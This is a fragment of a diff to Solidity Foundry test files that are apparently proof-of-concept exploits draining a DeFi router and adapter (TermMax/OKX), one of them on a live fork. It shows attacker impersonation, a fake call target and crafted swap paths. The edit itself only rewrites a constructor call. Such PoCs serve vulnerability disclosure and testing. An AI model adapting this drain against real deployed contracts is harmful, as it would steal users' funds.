@@ -40,7 +40,7 @@ contract TermMaxOkxArbitraryTargetDrainPoC is RouterTestV2 {
         SwapUnit[] memory units = new SwapUnit[](1);
         units[0] = SwapUnit(address(adapter), address(res.collateral), address(res.debt), abi.encode(address(fake), address(fake), callData));
         SwapPath[] memory paths = new SwapPath[](1);
-        paths[0] = SwapPath(units, attacker, 1, false);
+        paths[0] = SwapPath({inputAmount: 1, recipient: attacker, useBalanceOnchain: false, units: units});
 
         vm.startPrank(attacker);
         res.collateral.approve(address(res.router), 1);
@@ -73,7 +73,7 @@ contract TermMaxOkxLiveForkDrainPoC is Test {
         SwapUnit[] memory units = new SwapUnit[](1);
         units[0] = SwapUnit(ADAPTER, address(input), victim, abi.encode(address(fake), address(fake), callData));
         SwapPath[] memory paths = new SwapPath[](1);
-        paths[0] = SwapPath(units, attacker, 1, false);
+        paths[0] = SwapPath({inputAmount: 1, recipient: attacker, useBalanceOnchain: false, units: units});
 
         vm.startPrank(attacker);
         input.approve(ROUTER, 1);
